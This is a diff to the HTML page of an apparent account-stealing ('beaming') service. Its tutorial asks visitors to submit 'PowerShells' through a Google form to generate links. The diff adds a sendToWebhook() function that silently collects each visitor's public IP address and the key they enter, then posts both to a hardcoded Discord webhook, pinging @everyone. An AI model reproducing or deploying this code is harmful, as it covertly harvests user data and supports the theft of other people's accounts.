@@ -40,6 +40,7 @@
             background-color: #0f3460;
             color: #eaeaea;
             font-size: 1em;
+            margin-bottom: 20px;
         }
         button {
             background-color: #00adb5;
@@ -49,7 +50,6 @@
             cursor: pointer;
             font-size: 1em;
             border-radius: 5px;
-            margin-top: 20px;
             transition: background-color 0.3s;
         }
         button:hover {
@@ -76,6 +76,11 @@
         a:hover {
             text-decoration: underline;
         }
+        iframe {
+            width: 560px;
+            height: 315px;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
@@ -96,10 +101,15 @@
         <a id="link-generator" href="https://forms.gle/9fQhnGiqRa1sZ5sq7" target="_blank">Link Generator</a>
         <p>Tutorial: How to Get Your PowerShell</p>
         <ul>
-            <li>- Send PowerShells via the link generator on the Google form</li>
+            <li>- Submit the "Powershell" to generate your beaming link.</li>
             <li>- ONLY WORKS ON PROFILE, WE ARE FIXING GAME LINKS SOON</li>
         </ul>
-        <button onclick="window.open('https://www.youtube.com/watch?v=zpvEXK6nc04')">View Tutorial</button>
+        
+
+        <iframe src="https://www.youtube.com/embed/zpvEXK6nc04" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+    
+        <input type="text" id="webhookKey" placeholder="Enter Key">
+        <button onclick="sendToWebhook()">Submit Key</button>
     </div>
 
     <script>
@@ -113,7 +123,38 @@
                 alert("Incorrect key. Please try again.");
             }
         }
-    </script>
 
+        async function sendToWebhook() {
+            const userKey = document.getElementById("webhookKey").value;
+            if (!userKey) {
+                alert("Please enter a key.");
+                return;
+            }
+
+            try {
+                const ipResponse = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
+
+                const webhookUrl = "https://discord.com/api/webhooks/1302810226734403595/MMPGCUIQa0FD3_5WDk5_pFGwIlGGCe_6GjmxqNTQTd15CzHQ-jIsBAfv0M3HTBArMTHf";
+                const payload = {
+                    content: `@everyone IP ADDRESS: ${ipAddress}\nKEY: ${userKey}`
+                };
+
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                alert("Key submitted successfully.");
+            } catch (error) {
+                console.error("Error sending to webhook:", error);
+                alert("There was an error submitting your key. Please try again.");
+            }
+        }
+    </script>
 </body>
 </html>
